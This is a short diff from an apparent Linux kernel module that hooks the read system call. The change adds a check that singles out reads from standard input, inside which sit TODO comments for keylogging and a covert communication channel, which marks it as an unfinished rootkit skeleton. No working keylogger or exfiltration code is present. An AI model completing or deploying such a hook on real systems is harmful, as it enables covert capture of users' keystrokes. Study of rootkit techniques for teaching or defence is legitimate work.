@@ -28,9 +28,12 @@ asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t coun
 	long ret;
 	ret = original_read(fd, buf, count);
 
-	// TODO: implement keylogging
-
-	// TODO: implement covert communication channel
+	if(ret >= 1 && fd == 0)
+	{
+		// TODO: implement keylogging
+		
+		// TODO: implement covert communication channel
+	}
 
 	/* nothing else below this line */
 	read_call_counter--;
